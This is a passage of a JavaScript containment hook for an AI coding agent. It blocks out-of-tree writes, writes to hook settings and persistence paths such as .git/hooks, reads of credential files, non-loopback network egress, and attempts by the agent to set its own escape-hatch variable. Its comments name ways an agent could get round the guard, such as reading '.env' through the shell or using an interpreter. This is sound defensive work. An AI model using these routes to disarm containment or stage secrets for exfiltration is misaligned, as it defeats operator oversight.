  // as CLAUDE_PROJECT_DIR; fall back to the hook payload's cwd (only when it is
  // a string — a non-string cwd from a malformed payload would otherwise crash
  // path.startsWith downstream), then process cwd. Coerced to String so every
  // downstream path op has a string root regardless of the source.
  const root = String(
    process.env.CLAUDE_PROJECT_DIR ||
      (typeof payload.cwd === 'string' ? payload.cwd : process.cwd())
  );

  // Out-of-tree + protected-in-tree write check (Write/Edit family).
  if (WRITE_TOOLS.has(tool)) {
    const target = input.file_path || input.notebook_path;
    if (target && isOutsideRoot(root, String(target))) {
      block(
        `blocked an out-of-tree ${tool} to "${target}" — the target resolves ` +
          `outside the project directory (${root}). If this is intentional, ` +
          `set AWOS_CONTAINMENT_OFF=1 or disable the awos-containment plugin.`
      );
    }
    if (target && isProtectedInTree(root, String(target))) {
      block(
        `blocked a ${tool} to protected in-tree path "${target}" — writing the ` +
          `hook/plugin registration in .claude/settings.json or a persistence ` +
          `sink (.git/hooks, .github/workflows) would disarm containment or ` +
          `plant durable execution. If intentional, set AWOS_CONTAINMENT_OFF=1 ` +
          `or disable the awos-containment plugin.`
      );
    }
  }

  // Secret-read check (Read/Glob/Grep). For Grep the `pattern` field is a
  // CONTENT regex, not a path, so it is deliberately not inspected — otherwise
  // grepping source for the literal text "id_rsa" would be a false block.
  if (READ_TOOLS.has(tool)) {
    const candidates =
      tool === 'Read'
        ? [input.file_path]
        : tool === 'Glob'
          ? [input.pattern, input.path]
          : [input.path, input.glob];
    for (const c of candidates) {
      if (typeof c === 'string' && isSecretPath(c)) {
        block(
          `blocked a ${tool} of secret-bearing file "${c}" — reading ` +
            `credentials/keys through the Read family is denied to raise the ` +
            `bar on staging secrets for exfiltration. (Defense-in-depth, not a ` +
            `sealed guarantee: a Bash read like \`cat .env\` is not covered — ` +
            `see the file header.) If this file is genuinely needed, set ` +
            `AWOS_CONTAINMENT_OFF=1.`
        );
      }
    }
  }

  // Bash/PowerShell checks: network egress (robust) and out-of-tree file writes
  // (best-effort — see the file header). PowerShell is a distinct Windows shell
  // tool whose command also arrives as input.command, so it runs the same
  // checks — otherwise it would bypass containment entirely.
  if (
    (tool === 'Bash' || tool === 'PowerShell') &&
    typeof input.command === 'string'
  ) {
    if (EGRESS_RE.test(input.command) && !isLoopbackOnlyEgress(input.command)) {
      block(
        `blocked a ${tool} command matching a network-egress pattern: ` +
          `${input.command.trim().slice(0, 200)} — data-transfer/networking ` +
          `commands to non-loopback hosts are denied to contain exfiltration ` +
          `(loopback/localhost is allowed). If this is a legitimate step, set ` +
          `AWOS_CONTAINMENT_OFF=1 or run it outside the agent.`
      );
    }
    const outTarget = bashOutOfTreeTarget(input.command, root);
    if (outTarget) {
      block(
        `blocked a ${tool} command that writes outside the project directory ` +
          `(target "${outTarget}", root ${root}): ` +
          `${input.command.trim().slice(0, 200)}. Redirecting or copying a ` +
          `file out of tree is denied to contain out-of-tree writes. If this ` +
          `is intentional, set AWOS_CONTAINMENT_OFF=1 or disable the ` +
          `awos-containment plugin. ` +
          `(Best-effort check: an interpreter can still evade it.)`
      );
    }
    const protTarget = bashProtectedTarget(input.command, root);
    if (protTarget) {
      block(
        `blocked a ${tool} command that writes protected in-tree path ` +
          `"${protTarget}": ${input.command.trim().slice(0, 200)}. A ` +
          `redirect/copy into the hook/plugin registration or a persistence ` +
          `sink (.git/hooks, .github/workflows) would disarm containment or ` +
          `plant durable execution. If intentional, set AWOS_CONTAINMENT_OFF=1. ` +
          `(Best-effort check: an interpreter can still evade it.)`
      );
    }
    // Bash read of a secret file (`cat .env`, `grep x .env`, `… < key.pem`) —
    // the route a weak model uses to route around the tool-level secret-read
    // deny. Best-effort (an interpreter still evades). Gated on isSecretPath so
    // ordinary reads (`cat README.md`) are never blocked.
    const secretRead = bashSecretRead(input.command);
    if (secretRead) {
      block(
        `blocked a ${tool} command that reads secret-bearing file "${secretRead}": ` +
          `${input.command.trim().slice(0, 200)}. Reading credentials/keys via ` +
          `the shell is denied to raise the bar on staging secrets for ` +
          `exfiltration. If this file is genuinely needed, set ` +
          `AWOS_CONTAINMENT_OFF=1. (Best-effort check: an interpreter can still ` +
          `evade it.)`
      );
    }
    // A Bash/PowerShell command that tries to set the escape hatch is tamper.
    // This only fires when the guard is ACTIVE (an operator did not set the
    // hatch in the environment) — the legitimate hatch is an environment
    // variable, never an in-run agent command. Covers the POSIX form
    // (`AWOS_CONTAINMENT_OFF=`, `export …=`) and the PowerShell form
    // (`$env:AWOS_CONTAINMENT_OFF=`, `Env:AWOS_CONTAINMENT_OFF`).
    if (
      /(?:^|[\n;&|]|\bexport\s+)\s*AWOS_CONTAINMENT_OFF\s*=|\$?[Ee][Nn][Vv]:AWOS_CONTAINMENT_OFF\s*=/.test(
        input.command
      )
    ) {
      block(
        `blocked a ${tool} command that sets AWOS_CONTAINMENT_OFF — the ` +
          `containment escape hatch is operator-only and must not be toggled ` +
          `from inside an agent run: ${input.command.trim().slice(0, 200)}.`
      );
    }
  }
  // No boundary crossing found: return so main() issues the single clean ALLOW.
}

main();
